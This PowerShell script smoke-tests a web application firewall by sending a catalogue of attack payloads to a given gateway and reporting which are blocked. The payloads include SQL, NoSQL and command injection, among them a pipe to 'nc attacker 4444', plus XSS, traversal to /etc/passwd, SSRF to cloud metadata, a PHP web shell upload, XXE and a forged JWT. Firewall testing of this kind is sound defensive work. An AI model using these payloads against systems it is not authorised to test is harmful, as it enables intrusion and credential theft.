param(
    [Parameter(Mandatory = $true)]
    [string]$GatewayBaseUrl,

    [string]$HealthPath = '/api/health',

    [int]$TimeoutSec = 20,

    [int[]]$BlockStatusCodes = @(403, 406),

    [bool]$IncludeRateLimitTest = $true,

    [int]$RateLimitBurstCount = 150,

    [string]$RateLimitPath = '/api/health',

    [switch]$FailIfAnyNotBlocked,

    [switch]$VerboseResponses
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

function Get-StatusCodeFromException {
    param([System.Exception]$Exception)

    if ($null -eq $Exception) {
        return $null
    }

    if ($null -ne $Exception.Response -and $null -ne $Exception.Response.StatusCode) {
        try {
            return [int]$Exception.Response.StatusCode
        }
        catch {
            return $null
        }
    }

    return $null
}

function Invoke-WafProbe {
    param(
        [string]$Name,
        [string]$Method,
        [string]$Path,
        [string]$Query,
        [hashtable]$Headers,
        [string]$Body,
        [string]$ContentType
    )

    $base = $GatewayBaseUrl.TrimEnd('/')
    $url = "$base$Path"
    if (-not [string]::IsNullOrWhiteSpace($Query)) {
        $url = "${url}?$Query"
    }

    $invokeParams = @{
        Uri         = $url
        Method      = $Method
        TimeoutSec  = $TimeoutSec
        UseBasicParsing = $true
    }

    if ($null -ne $Headers -and $Headers.Count -gt 0) {
        $invokeParams.Headers = $Headers
    }

    if (-not [string]::IsNullOrEmpty($Body)) {
        $invokeParams.Body = $Body
        if (-not [string]::IsNullOrEmpty($ContentType)) {
            $invokeParams.ContentType = $ContentType
        }
    }

    $statusCode = $null
    $ok = $false
    $responseText = ''
    $errorText = ''

    try {
        $resp = Invoke-WebRequest @invokeParams
        $statusCode = [int]$resp.StatusCode
        $ok = $true
        $responseText = [string]$resp.Content
    }
    catch {
        $statusCode = Get-StatusCodeFromException -Exception $_.Exception
        $errorText = [string]$_.Exception.Message
    }

    $isBlocked = $false
    if ($null -ne $statusCode -and $BlockStatusCodes -contains $statusCode) {
        $isBlocked = $true
    }

    [PSCustomObject]@{
        TestName      = $Name
        Method        = $Method
        Url           = $url
        StatusCode    = $statusCode
        IsBlocked     = $isBlocked
        RequestOk     = $ok
        Error         = $errorText
        ResponseShort = if ($VerboseResponses) { $responseText } else { '' }
    }
}

function New-WafTest {
    param(
        [string]$Category,
        [string]$Name,
        [string]$Method,
        [string]$Path,
        [string]$Query,
        [hashtable]$Headers,
        [string]$Body,
        [string]$ContentType
    )

    return @{
        Category    = $Category
        Name        = $Name
        Method      = $Method
        Path        = $Path
        Query       = $Query
        Headers     = $Headers
        Body        = $Body
        ContentType = $ContentType
    }
}

function Invoke-RateLimitBurstTest {
    param(
        [string]$Path,
        [int]$BurstCount
    )

    $base = $GatewayBaseUrl.TrimEnd('/')
    $url = "$base$Path"

    $blocked = 0
    $lastStatus = $null
    $errors = 0

    for ($i = 1; $i -le $BurstCount; $i++) {
        try {
            $resp = Invoke-WebRequest -Uri $url -Method 'GET' -TimeoutSec $TimeoutSec -UseBasicParsing
            $lastStatus = [int]$resp.StatusCode
            if ($BlockStatusCodes -contains $lastStatus) {
                $blocked++
            }
        }
        catch {
            $status = Get-StatusCodeFromException -Exception $_.Exception
            if ($null -ne $status) {
                $lastStatus = $status
                if ($BlockStatusCodes -contains $status) {
                    $blocked++
                }
            }
            else {
                $errors++
            }
        }
    }

    $isBlocked = $blocked -gt 0
    return [PSCustomObject]@{
        Category      = 'RateLimit'
        TestName      = "Burst $BurstCount req on $Path"
        Method        = 'GET'
        Url           = $url
        StatusCode    = $lastStatus
        IsBlocked     = $isBlocked
        RequestOk     = $true
        Error         = if ($errors -gt 0) { "$errors request(s) without HTTP response" } else { '' }
        ResponseShort = ''
    }
}

Write-Host ''
Write-Host '=== WAF Security Smoke Test ===' -ForegroundColor Cyan
Write-Host "Gateway: $($GatewayBaseUrl.TrimEnd('/'))" -ForegroundColor Cyan
Write-Host "Expected block status: $($BlockStatusCodes -join ', ')" -ForegroundColor Cyan
Write-Host ''

$tests = @(
    # SQL Injection
    (New-WafTest -Category 'SQLi' -Name 'Boolean SQLi' -Method 'GET' -Path $HealthPath -Query ('q=' + [uri]::EscapeDataString("' OR 1=1--"))),
    (New-WafTest -Category 'SQLi' -Name 'UNION SQLi' -Method 'GET' -Path $HealthPath -Query ('q=' + [uri]::EscapeDataString("' UNION SELECT NULL,@@version--"))),
    (New-WafTest -Category 'SQLi' -Name 'Time-based SQLi' -Method 'GET' -Path $HealthPath -Query ('q=' + [uri]::EscapeDataString("'; WAITFOR DELAY '0:0:5'--"))),
    (New-WafTest -Category 'SQLi' -Name 'Stacked SQLi' -Method 'GET' -Path $HealthPath -Query ('id=' + [uri]::EscapeDataString('1; DROP TABLE users--'))),
    (New-WafTest -Category 'SQLi' -Name 'SQLi JSON body' -Method 'POST' -Path '/api/auth/login' -Body '{"email":"admin'' OR 1=1--","password":"x"}' -ContentType 'application/json'),

    # XSS
    (New-WafTest -Category 'XSS' -Name 'Reflected script tag' -Method 'GET' -Path $HealthPath -Query ('q=' + [uri]::EscapeDataString('<script>alert(1)</script>'))),
    (New-WafTest -Category 'XSS' -Name 'IMG onerror' -Method 'GET' -Path $HealthPath -Query ('q=' + [uri]::EscapeDataString('<img src=x onerror=alert(1)>'))),
    (New-WafTest -Category 'XSS' -Name 'SVG onload' -Method 'GET' -Path $HealthPath -Query ('q=' + [uri]::EscapeDataString('<svg/onload=alert(1)>'))),
    (New-WafTest -Category 'XSS' -Name 'Header XSS payload' -Method 'GET' -Path $HealthPath -Headers @{ 'User-Agent' = '<script>alert(1)</script>' }),

    # Traversal / LFI / RFI
    (New-WafTest -Category 'Traversal' -Name 'Unix traversal' -Method 'GET' -Path $HealthPath -Query ('file=' + [uri]::EscapeDataString('../../../../etc/passwd'))),
    (New-WafTest -Category 'Traversal' -Name 'Windows traversal' -Method 'GET' -Path $HealthPath -Query ('file=' + [uri]::EscapeDataString('..\\..\\..\\windows\\win.ini'))),
    (New-WafTest -Category 'LFI' -Name 'LFI proc environ' -Method 'GET' -Path $HealthPath -Query ('page=' + [uri]::EscapeDataString('/proc/self/environ'))),
    (New-WafTest -Category 'RFI' -Name 'Remote include URL' -Method 'GET' -Path $HealthPath -Query ('page=' + [uri]::EscapeDataString('http://evil.local/shell.txt'))),

    # Command Injection / RCE
    (New-WafTest -Category 'CmdInjection' -Name 'Semicolon command chaining' -Method 'GET' -Path $HealthPath -Query ('cmd=' + [uri]::EscapeDataString('cat /etc/passwd; id'))),
    (New-WafTest -Category 'CmdInjection' -Name 'AND command chaining' -Method 'GET' -Path $HealthPath -Query ('cmd=' + [uri]::EscapeDataString('whoami && id'))),
    (New-WafTest -Category 'CmdInjection' -Name 'Pipe command chaining' -Method 'GET' -Path $HealthPath -Query ('cmd=' + [uri]::EscapeDataString('whoami | nc attacker 4444'))),
    (New-WafTest -Category 'RCE' -Name 'PowerShell encoded command' -Method 'GET' -Path $HealthPath -Query ('exec=' + [uri]::EscapeDataString('powershell -enc SQBtACcAbQAgAHMAdQBzAA=='))),

    # NoSQLi
    (New-WafTest -Category 'NoSQLi' -Name 'Mongo $ne injection' -Method 'POST' -Path '/api/auth/login' -Body '{"email":{"$ne":null},"password":{"$ne":null}}' -ContentType 'application/json'),
    (New-WafTest -Category 'NoSQLi' -Name 'Mongo regex auth bypass' -Method 'POST' -Path '/api/auth/login' -Body '{"email":{"$regex":".*"},"password":{"$regex":".*"}}' -ContentType 'application/json'),

    # SSRF / metadata access
    (New-WafTest -Category 'SSRF' -Name 'Azure metadata endpoint' -Method 'GET' -Path $HealthPath -Query ('url=' + [uri]::EscapeDataString('http://169.254.169.254/metadata/instance?api-version=2021-02-01'))),
    (New-WafTest -Category 'SSRF' -Name 'AWS metadata endpoint' -Method 'GET' -Path $HealthPath -Query ('url=' + [uri]::EscapeDataString('http://169.254.169.254/latest/meta-data/'))),

    # Header / protocol abuse
    (New-WafTest -Category 'Headers' -Name 'X-Forwarded-For spoof chain' -Method 'GET' -Path $HealthPath -Headers @{ 'X-Forwarded-For' = '127.0.0.1, 10.0.0.1, 8.8.8.8' }),
    (New-WafTest -Category 'Headers' -Name 'X-Original-URL bypass attempt' -Method 'GET' -Path $HealthPath -Headers @{ 'X-Original-URL' = '/admin' }),

    # Upload / content-type abuse
    (New-WafTest -Category 'Upload' -Name 'PHP shell filename upload marker' -Method 'POST' -Path '/api/upload' -Body '------AaB03x`r`nContent-Disposition: form-data; name="file"; filename="shell.php"`r`nContent-Type: application/octet-stream`r`n`r`n<?php system($_GET["cmd"]); ?>`r`n------AaB03x--' -ContentType 'multipart/form-data; boundary=----AaB03x'),
    (New-WafTest -Category 'XXE' -Name 'XML external entity payload' -Method 'POST' -Path '/api/health' -Body '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>' -ContentType 'application/xml'),

    # JWT / auth tampering
    (New-WafTest -Category 'Auth' -Name 'JWT alg none token' -Method 'GET' -Path '/api/users' -Headers @{ 'Authorization' = 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.' }),
    (New-WafTest -Category 'Auth' -Name 'Overlong bearer token' -Method 'GET' -Path '/api/users' -Headers @{ 'Authorization' = ('Bearer ' + ('A' * 5000)) })
)

$results = New-Object System.Collections.Generic.List[object]

foreach ($test in $tests) {
    $query = if ($test.ContainsKey('Query')) { $test['Query'] } else { $null }
    $headers = if ($test.ContainsKey('Headers')) { $test['Headers'] } else { $null }
    $body = if ($test.ContainsKey('Body')) { $test['Body'] } else { $null }
    $contentType = if ($test.ContainsKey('ContentType')) { $test['ContentType'] } else { $null }

    $probeParams = @{
        Name        = $test.Name
        Method      = $test.Method
        Path        = $test.Path
        Query       = $query
        Headers     = $headers
        Body        = $body
        ContentType = $contentType
    }

    $result = Invoke-WafProbe @probeParams
    $result | Add-Member -NotePropertyName Category -NotePropertyValue $test.Category

    $results.Add($result)

    $color = if ($result.IsBlocked) { 'Green' } else { 'Yellow' }
    $codeText = if ($null -eq $result.StatusCode) { 'n/a' } else { [string]$result.StatusCode }
    $blockLabel = if ($result.IsBlocked) { 'BLOCKED' } else { 'NOT BLOCKED' }
    Write-Host ("[{0}] {1} -> HTTP {2}" -f $blockLabel, $result.TestName, $codeText) -ForegroundColor $color

    if (-not [string]::IsNullOrWhiteSpace($result.Error)) {
        Write-Host "  Error: $($result.Error)" -ForegroundColor DarkGray
    }
}

if ($IncludeRateLimitTest) {
    Write-Host ''
    Write-Host '=== Rate Limit Test ===' -ForegroundColor Cyan
    $rateResult = Invoke-RateLimitBurstTest -Path $RateLimitPath -BurstCount $RateLimitBurstCount
    $results.Add($rateResult)
    $rateColor = if ($rateResult.IsBlocked) { 'Green' } else { 'Yellow' }
    $rateCodeText = if ($null -eq $rateResult.StatusCode) { 'n/a' } else { [string]$rateResult.StatusCode }
    $rateLabel = if ($rateResult.IsBlocked) { 'BLOCKED' } else { 'NOT BLOCKED' }
    Write-Host ("[{0}] {1} -> last HTTP {2}" -f $rateLabel, $rateResult.TestName, $rateCodeText) -ForegroundColor $rateColor
    if (-not [string]::IsNullOrWhiteSpace($rateResult.Error)) {
        Write-Host "  Error: $($rateResult.Error)" -ForegroundColor DarkGray
    }
}

Write-Host ''
Write-Host '=== Summary ===' -ForegroundColor Cyan

$blockedCount = ($results | Where-Object { $_.IsBlocked }).Count
$notBlockedCount = $results.Count - $blockedCount

$results |
    Select-Object Category, TestName, Method, StatusCode, IsBlocked |
    Format-Table -AutoSize

Write-Host ''
Write-Host "Blocked: $blockedCount / $($results.Count)" -ForegroundColor Cyan
Write-Host "Not blocked: $notBlockedCount / $($results.Count)" -ForegroundColor Cyan

if ($FailIfAnyNotBlocked -and $notBlockedCount -gt 0) {
    Write-Error 'At least one malicious payload was not blocked by the WAF.'
    exit 1
}

exit 0
